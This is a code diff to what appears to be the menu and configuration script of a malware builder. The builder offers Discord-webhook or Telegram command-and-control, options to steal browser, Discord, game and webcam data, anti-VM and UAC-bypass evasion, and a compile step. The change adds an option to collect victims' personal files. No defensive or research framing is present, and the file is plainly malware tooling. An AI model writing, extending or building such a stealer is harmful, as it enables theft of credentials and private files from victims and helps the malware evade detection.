@@ -23,7 +23,8 @@ config = {
     "webcam": False,
     "blocksites": False,
     "antivm": False,
-    "uacbypass": False
+    "uacbypass": False,
+    "personalfiles": False
 }
 
 def load(file):
@@ -71,6 +72,7 @@ def fetchsettings():
     blocksites = config['blocksites']
     antivm = config['antivm']
     uacbypass = config['uacbypass']
+    collectpersonalfiles = config['personalfiles']
     if c2type == 'discord':
         print('''Settings
         
@@ -83,7 +85,8 @@ def fetchsettings():
     Block websites: {}
     Anti-VM: {}
     UAC Bypass: {}
-    '''.format(c2type, webhookurl, grabbrowsers, grabdiscord, grabgames, grabwebcam, blocksites, antivm, uacbypass))
+    Collect Personal Files: {}
+    '''.format(c2type, webhookurl, grabbrowsers, grabdiscord, grabgames, grabwebcam, blocksites, antivm, uacbypass, collectpersonalfiles))
     elif c2type == 'telegram':
         print('''Settings
         
@@ -96,14 +99,15 @@ def fetchsettings():
     Block websites: {}
     Anti-VM: {}
     UAC Bypass: {}
-    '''.format(c2type, telebot, grabbrowsers, grabdiscord, grabgames, grabwebcam, blocksites, antivm, uacbypass))
+    Collect Personal Files: {}
+    '''.format(c2type, telebot, grabbrowsers, grabdiscord, grabgames, grabwebcam, blocksites, antivm, uacbypass, collectpersonalfiles))
 
 def menu():
     global config
     asc = Ascii()
     print(asc.ascii())
     print(Options().options())
-    options = ['ChangeC2', 'CollectBrowsers', 'CollectDiscord', 'CollectGames', 'CollectWebcam', 'BlockWebsites', 'AntiVM', 'UACBypass', 'SaveSettings', 'Compile']
+    options = ['ChangeC2', 'CollectBrowsers', 'CollectDiscord', 'CollectGames', 'CollectWebcam', 'BlockWebsites', 'AntiVM', 'UACBypass', 'CollectPersonalFiles', 'SaveSettings', 'Compile']
     
     fetchsettings()
     opts = {str(i + 1): name for i, name in enumerate(options)}
@@ -173,6 +177,11 @@ def menu():
                 cls()
                 menu()
 
+            elif name == 'CollectPersonalFiles':
+                config['personalfiles'] = not config['personalfiles']
+                cls()
+                menu()
+                    
             elif name == 'SaveSettings':
                 applysettings()
                 cls()
